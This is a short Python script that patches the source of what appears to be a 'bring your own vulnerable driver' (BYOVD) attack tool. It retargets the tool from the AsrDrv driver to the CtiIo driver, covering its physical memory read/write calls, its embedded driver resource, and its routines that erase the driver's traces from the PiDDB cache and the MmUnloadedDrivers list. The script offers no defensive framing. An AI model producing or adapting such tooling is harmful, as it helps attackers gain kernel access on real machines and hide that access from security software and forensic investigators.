import re, sys

with open('byovd.c', 'rb') as f:
    data = f.read()
text = data.decode('utf-8', errors='replace')

fixes = [
    ('if(!AsrPhysWrite(pa, src, chunk)) return FALSE;',
     'if(!CtiPhysWrite(pa, src, chunk)) return FALSE;'),
    ('if (!AsrPhysRead(pa, buf + bufFill, PAGE))',
     'if (!CtiPhysRead(pa, buf + bufFill, PAGE))'),
    ('IDR_ASRDRV103', 'IDR_CTIIO64'),
    # PiDDB Pk_Walk string match
    ('_wcsnicmp(nm,L"AsrDrv",6)==0||_wcsnicmp(nm,L"asrdrv",6)==0',
     '_wcsnicmp(nm,L"CtiIo",5)==0'),
    # MmUnloadedDrivers string match  
    ('_wcsnicmp(nm,L"AsrDrv",6)==0||_wcsnicmp(nm,L"AsrDrv",6)==0',
     '_wcsnicmp(nm,L"CtiIo",5)==0'),
]

for old, new in fixes:
    c = text.count(old)
    text = text.replace(old, new)
    print(f'{c}x replaced: {repr(old[:60])}')

with open('byovd.c', 'w', encoding='utf-8') as f:
    f.write(text)
print('DONE')
